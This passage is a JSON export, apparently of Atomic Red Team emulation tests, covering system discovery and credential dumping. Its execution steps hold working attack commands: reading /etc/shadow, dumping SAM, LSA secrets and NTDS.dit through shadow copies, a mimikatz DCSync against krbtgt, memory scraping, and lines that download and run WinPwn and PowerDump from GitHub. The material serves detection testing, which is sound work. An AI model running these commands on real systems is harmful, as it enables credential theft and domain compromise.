HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n", "successCriteria": null}], "techniqueIds": ["clacwm6m003m829mqe30zhkda", "clacwm2aq00pv29mqdei02m77"], "tags": []}, {"data": {"name": "Enumerate COM Objects in Registry with Powershell", "shortName": "T1012", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | File to output list of COM objects to | String | $env:temp\\T1592.002Test1.txt | "}, "executionSteps": [{"description": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR\nGet-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt\nForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\")\n{try{write-output \"$($Position)-$($CLSID)\"\nwrite-output \"------------\"| out-file #{output_file} -append\nwrite-output $($CLSID)| out-file #{output_file} -append\n$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))\n$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append\n$position += 1} catch{}}\n", "successCriteria": null}], "techniqueIds": ["clacwm6m003m829mqe30zhkda"], "tags": []}, {"data": {"name": "List Process Main Windows - C# .NET", "shortName": "T1010", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Compiles and executes C# code to list main window titles associated with each process.\n\nUpon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_source_code | Path to source of C# code | Path | PathToAtomicsFolder\\T1010\\src\\T1010.cs | \n | output_file_name | Name of output binary | String | %TEMP%\\T1010.exe | "}, "executionSteps": [{"description": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} #{input_source_code}\n#{output_file_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm62f031729mqc5574768", "clacwm1ci002b29mq248j5fmk"], "tags": []}, {"data": {"name": "System Service Discovery - systemctl", "shortName": "T1007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerates system service using systemctl\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "systemctl --type=service\n", "successCriteria": null}], "techniqueIds": ["clacwm5xz02wr29mqfrtt0wa2"], "tags": []}, {"data": {"name": "System Service Discovery - net.exe", "shortName": "T1007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.\n\nUpon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in c:\\Windows\\Temp\\service-list.txt.s\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path of file to hold net.exe output | Path | C:\\Windows\\Temp\\service-list.txt | "}, "executionSteps": [{"description": "net.exe start >> #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5xz02wr29mqfrtt0wa2", "clacwm2id00we29mq1jx74q7q"], "tags": []}, {"data": {"name": "System Service Discovery", "shortName": "T1007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify system services.\n\nUpon successful execution, cmd.exe will execute service commands with expected result to stdout.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "tasklist.exe\nsc query\nsc query state= all\n", "successCriteria": null}], "techniqueIds": ["clacwm5xz02wr29mqfrtt0wa2", "clacwm2id00we29mq1jx74q7q"], "tags": []}, {"data": {"name": "Read volume boot sector via DOS device path (PowerShell)", "shortName": "T1006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 \u00ebR?NTFS\n```\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | volume | Drive letter of the volume to access | String | C: | "}, "executionSteps": [{"description": "$buffer = New-Object byte[] 11\n$handle = New-Object IO.FileStream \"\\\\.\\#{volume}\", 'Open', 'Read', 'ReadWrite'\n$handle.Read($buffer, 0, $buffer.Length)\n$handle.Close()\nFormat-Hex -InputObject $buffer\n", "successCriteria": null}], "techniqueIds": ["clacwm5qq02p929mq930zgkyi", "clacwm1o0009w29mq5oke4aoj"], "tags": []}, {"data": {"name": "Access /etc/shadow (Local)", "shortName": "T1003.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "/etc/shadow file is accessed in Linux environments\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed | Path | /tmp/T1003.008.txt | "}, "executionSteps": [{"description": "sudo cat /etc/shadow > #{output_file}\ncat #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6o703or29mq7imj1hk6", "clacwm19x000u29mqceg4doyy"], "tags": []}, {"data": {"name": "Access /etc/passwd (Local)", "shortName": "T1003.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "/etc/passwd file is accessed in Linux environments\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed | Path | /tmp/T1003.008.txt | "}, "executionSteps": [{"description": "cat /etc/passwd > #{output_file}\ncat #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6o703or29mq7imj1hk6", "clacwm19x000u29mqceg4doyy"], "tags": []}, {"data": {"name": "Access /etc/{shadow,passwd} with shell builtins", "shortName": "T1003.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Dump /etc/passwd and /etc/shadow using bash builtins\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed | Path | /tmp/T1003.008.txt | "}, "executionSteps": [{"description": "function testcat(){ echo \"$(< $1)\"; }\ntestcat /etc/passwd > #{output_file}\ntestcat /etc/shadow > #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6o703or29mq7imj1hk6"], "tags": []}, {"data": {"name": "Access /etc/{shadow,passwd} with a standard bin that's not cat", "shortName": "T1003.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Dump /etc/passwd and /etc/shadow using ed\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed | Path | /tmp/T1003.008.txt | "}, "executionSteps": [{"description": "echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6o703or29mq7imj1hk6"], "tags": []}, {"data": {"name": "Dump individual process memory with sh (Local)", "shortName": "T1003.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed | Path | /tmp/T1003.007.bin | \n | script_path | Path to script generating the target process | Path | /tmp/T1003.007.sh | \n | pid_term | Unique string to use to identify target process | String | T1003.007 | "}, "executionSteps": [{"description": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"#{output_file}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5xi02we29mq669ga2fo"], "tags": []}, {"data": {"name": "Dump individual process memory with Python (Local)", "shortName": "T1003.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to\ncopy a process's heap memory to an external file so it can be searched or exfiltrated later.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed | Path | /tmp/T1003.007.bin | \n | script_path | Path to script generating the target process | Path | /tmp/T1003.007.sh | \n | python_script | Path to script generating the target process | Path | PathToAtomicsFolder/T1003.007/src/dump_heap.py | \n | pid_term | Unique string to use to identify target process | String | T1003.007 | "}, "executionSteps": [{"description": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nPYTHON=$(which python || which python3 || which python2)\n$PYTHON #{python_script} $PID #{output_file}\ngrep -i \"PASS\" \"#{output_file}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5xi02we29mq669ga2fo"], "tags": []}, {"data": {"name": "Capture Passwords with MimiPenguin", "shortName": "T1003.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed | Path | /tmp/T1003.007Test3.txt | \n | MimiPenguin_Location | Path of MimiPenguin script | Path | /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh | "}, "executionSteps": [{"description": "sudo #{MimiPenguin_Location} > #{output_file}\ncat #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5xi02we29mq669ga2fo"], "tags": []}, {"data": {"name": "Run DSInternals Get-ADReplAccount", "shortName": "T1003.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellerParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | logonserver | ComputerName argument default %logonserver% | String | $ENV:logonserver.TrimStart(\"\\\") | "}, "executionSteps": [{"description": "Get-ADReplAccount -All -Server #{logonserver}\n", "successCriteria": null}], "techniqueIds": ["clacwm6te03uj29mqh1ciec4s"], "tags": []}, {"data": {"name": "DCSync (Active Directory)", "shortName": "T1003.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.\nWorks against a remote Windows Domain Controller using the replication protocol.\nPrivileges required: domain admin or domain controller account (by default), or any other account with required rights.\n[Reference](https://adsecurity.org/?p=1729)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain | Targeted Active Directory domain | String | %userdnsdomain% | \n | user | Targeted user | String | krbtgt | \n | mimikatz_path | Mimikatz windows executable | Path | %tmp%\\mimikatz\\x64\\mimikatz.exe | "}, "executionSteps": [{"description": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6te03uj29mqh1ciec4s"], "tags": []}, {"data": {"name": "DCSync", "shortName": "T1003.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.\nWorks against a remote Windows Domain Controller using the replication protocol.\nPrivileges required: domain admin or domain controller account (by default), or any other account with required rights.\n[Reference](https://adsecurity.org/?p=1729)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain | Targeted domain | string | example.com | \n | user | Targeted user | string | krbtgt | \n | mimikatz_path | Mimikatz windows executable | path | %tmp%\\mimikatz\\x64\\mimikatz.exe | "}, "executionSteps": [{"description": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\"", "successCriteria": null}], "techniqueIds": ["clacwm1kz007s29mqgxz2b1gx"], "tags": []}, {"data": {"name": "Cached Credential Dump via Cmdkey", "shortName": "T1003.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "List credentials currently stored on the host via the built-in Windows utility cmdkey.exe\nCredentials listed with Cmdkey only pertain to the current user\nPasswords will not be displayed once they are stored\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey\nhttps://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "cmdkey /list\n", "successCriteria": null}], "techniqueIds": ["clacwm68m037f29mq322je8qq"], "tags": []}, {"data": {"name": "Dumping LSA Secrets", "shortName": "T1003.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Dump secrets key from Windows registry\nWhen successful, the dumped file will be written to $env:Temp\\secrets.\nAttackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.\nhttps://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | psexec_exe | Path to PsExec executable | Path | PathToAtomicsFolder\\T1003.004\\bin\\PsExec.exe | "}, "executionSteps": [{"description": "#{psexec_exe} -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y", "successCriteria": null}], "techniqueIds": ["clacwm5uc02t629mqetnwhj19", "clacwm20q00i729mqbt5f5doi"], "tags": []}, {"data": {"name": "Dump Active Directory Database with NTDSUtil", "shortName": "T1003.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_folder | Path where resulting dump should be placed | Path | C:\\Windows\\Temp\\ntds_T1003 | "}, "executionSteps": [{"description": "mkdir #{output_folder}\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q\n", "successCriteria": null}], "techniqueIds": ["clacwm6sf03to29mqav83c5zx", "clacwm24p00kv29mq6ov2bnjo"], "tags": []}, {"data": {"name": "Create Volume Shadow Copy with WMI", "shortName": "T1003.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | drive_letter | Drive letter to source VSC (including colon and backslash) | String | C:\\ | "}, "executionSteps": [{"description": "wmic shadowcopy call create Volume=#{drive_letter}\n", "successCriteria": null}], "techniqueIds": ["clacwm6sf03to29mqav83c5zx", "clacwm24p00kv29mq6ov2bnjo"], "tags": []}, {"data": {"name": "Create Volume Shadow Copy with vssadmin", "shortName": "T1003.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | drive_letter | Drive letter to source VSC (including colon) | String | C: | "}, "executionSteps": [{"description": "vssadmin.exe create shadow /for=#{drive_letter}\n", "successCriteria": null}], "techniqueIds": ["clacwm6sf03to29mqav83c5zx", "clacwm24p00kv29mq6ov2bnjo"], "tags": []}, {"data": {"name": "Create Volume Shadow Copy with Powershell", "shortName": "T1003.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | drive_letter | Drive letter to source VSC (including colon) | String | C:\\ | "}, "executionSteps": [{"description": "(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')\n", "successCriteria": null}], "techniqueIds": ["clacwm6sf03to29mqav83c5zx", "clacwm24p00kv29mq6ov2bnjo"], "tags": []}, {"data": {"name": "Create Volume Shadow Copy remotely with WMI", "shortName": "T1003.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | drive_letter | Drive letter to source VSC (including colon and backslash) | String | C:\\ | \n | target_host | IP Address / Hostname you want to target | String | localhost | "}, "executionSteps": [{"description": "wmic /node:\"#{target_host}\" shadowcopy call create Volume=#{drive_letter}\n", "successCriteria": null}], "techniqueIds": ["clacwm6sf03to29mqav83c5zx"], "tags": []}, {"data": {"name": "Create Volume Shadow Copy remotely (WMI) with esentutl", "shortName": "T1003.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | source_path | File to shadow copy | String | c:\\windows\\ntds\\ntds.dit | \n | target_path | Target path of the result file | String | c:\\ntds.dit | \n | target_host | IP Address / Hostname you want to target | String | localhost | "}, "executionSteps": [{"description": "wmic /node:\"#{target_host}\" process call create \"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6sf03to29mqav83c5zx"], "tags": []}, {"data": {"name": "Create Symlink to Volume Shadow Copy", "shortName": "T1003.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | drive_letter | Drive letter to source VSC (including colon) | String | C: | \n | symlink_path | symlink path | String | C:\\Temp\\vssstore | "}, "executionSteps": [{"description": "vssadmin.exe create shadow /for=#{drive_letter}\nmklink /D #{symlink_path} \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n", "successCriteria": null}], "techniqueIds": ["clacwm6sf03to29mqav83c5zx", "clacwm24p00kv29mq6ov2bnjo"], "tags": []}, {"data": {"name": "Copy NTDS.dit from Volume Shadow Copy", "shortName": "T1003.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with vssadmin\".\nA successful test also requires the export of the SYSTEM Registry hive.\nThis test must be executed on a Windows Domain Controller.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | vsc_name | Name of Volume Shadow Copy | String | \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 | \n | extract_path | Path for extracted NTDS.dit | Path | C:\\Windows\\Temp | "}, "executionSteps": [{"description": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n", "successCriteria": null}], "techniqueIds": ["clacwm6sf03to29mqav83c5zx", "clacwm24p00kv29mq6ov2bnjo"], "tags": []}, {"data": {"name": "WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes", "shortName": "T1003.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive  ", "successCriteria": null}], "techniqueIds": ["clacwm5sc02r729mq59ssc5bz"], "tags": []}, {"data": {"name": "Registry parse with pypykatz", "shortName": "T1003.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Parses registry hives to obtain stored credentials\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "pypykatz live registry\n", "successCriteria": null}], "techniqueIds": ["clacwm5sc02r729mq59ssc5bz", "clacwm2eh00t029mq4mgmgg67"], "tags": []}, {"data": {"name": "Registry dump of SAM, creds, and secrets", "shortName": "T1003.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n", "successCriteria": null}], "techniqueIds": ["clacwm5sc02r729mq59ssc5bz", "clacwm2eh00t029mq4mgmgg67"], "tags": []}, {"data": {"name": "PowerDump Registry dump of SAM for hashes and usernames", "shortName": "T1003.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes a hashdump by reading the hasshes from the registry.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green\nSet-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\nInvoke-Webrequest -Uri \"https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1\" -UseBasicParsing -OutFile \"$Env:Temp\\PowerDump.ps1\"\nImport-Module .\\PowerDump.ps1\nInvoke-PowerDump", "successCriteria": null}], "techniqueIds": ["clacwm2eh00t029mq4mgmgg67"], "tags": []}, {"data": {"name": "PowerDump Hashes and Usernames from Registry", "shortName": "T1003.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes a hashdump by reading the hashes from the registry.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green\nImport-Module \"$Env:Temp\\PowerDump.ps1\"\nInvoke-PowerDump", "successCriteria": null}], "techniqueIds": ["clacwm5sc02r729mq59ssc5bz"], "tags": []}, {"data": {"name": "esentutl.exe SAM copy", "shortName": "T1003.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copy the SAM hive using the esentutl.exe utility\nThis can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_path | Path to the file to copy | Path | %SystemRoot%/system32/config/SAM | \n | file_name | Name of the copied file | String | SAM | \n | copy_dest | Destination of the copied file | String | %temp% | "}, "executionSteps": [{"description": "esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm5sc02r729mq59ssc5bz", "clacwm2eh00t029mq4mgmgg67"], "tags": []}, {"data": {"name": "dump volume shadow copy hives with System.IO.File", "shortName": "T1003.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Dump hives from volume shadow copies with System.IO.File\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dump_path | Path where the hive will be dumped | Path | $ENV:temp | \n | target_hive | Hive you wish to dump | String | SAM | \n | dumped_hive | Name of the dumped hive | String | myhive | "}, "executionSteps": [{"description": "write-host \"\"\n$shadowlist = get-wmiobject win32_shadowcopy\n$volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}\n$maxvolume = ($volumenumbers | Sort-Object -Descending)[0]\n$shadowpath = \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\" + $maxvolume + \"\\Windows\\System32\\config\\#{target_hive}\"\n$mydump = #{dump_path} + '\\' + '#{dumped_hive}'\n[System.IO.File]::Copy($shadowpath , $mydump)\n", "successCriteria": null}], "techniqueIds": ["clacwm5sc02r729mq59ssc5bz"], "tags": []}, {"data": {"name": "dump volume shadow copy hives with certutil", "shortName": "T1003.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Dump hives from volume shadow copies with the certutil utility\nThis can be done with a non-admin user account\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dump_path | Path where the hive will be dumped | Path | $ENV:temp | \n | target_hive | Hive you wish to dump | String | SAM | \n | dumped_hive | Name of the dumped hive | String | myhive | "}, "executionSteps": [{"description": "write-host \"\"\n$shadowlist = get-wmiobject win32_shadowcopy\n$volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}\n$maxvolume = ($volumenumbers | Sort-Object -Descending)[0]\n$shadowpath = \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\" + $maxvolume + \"\\Windows\\System32\\config\\#{target_hive}\"\ncertutil -f -v -encodehex $shadowpath #{dump_path}\\#{dumped_hive} 2\n", "successCriteria": null}], "techniqueIds": ["clacwm5sc02r729mq59ssc5bz"], "tags": []}, {"data": {"name": "Windows Credential Editor", "shortName": "T1003.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Dump user credentials using Windows Credential Editor (supports Windows XP, 2003, Vista, 7, 2008 and Windows 8 only)\n\nUpon successful execution, you should see a file with user passwords/hashes at %temp%/wce-output.file.\n\nIf you see no output it is likely that execution was blocked by Anti-Virus. \n\nIf you see a message saying \\\"wce.exe is not recognized as an internal or external command\\\", try using the  get-prereq_commands to download and install Windows Credential Editor first.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where resulting data should be placed | Path | %temp%\\wce-output.txt | \n | wce_zip_hash | File hash of the Windows Credential Editor zip file | String | 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933 | \n | wce_exe | Path of Windows Credential Editor executable | Path | PathToAtomicsFolder\\T1003.001\\bin\\wce.exe | \n | wce_url | Path to download Windows Credential Editor zip file | url | https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip | "}, "executionSteps": [{"description": "#{wce_exe} -o #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm21200ic29mq7b3i3cxx"], "tags": []}, {"data": {"name": "Powershell Mimikatz", "shortName": "T1003.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the 